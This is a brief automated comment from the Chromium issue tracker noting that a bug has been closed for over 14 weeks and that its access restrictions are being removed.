This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/474266014)*
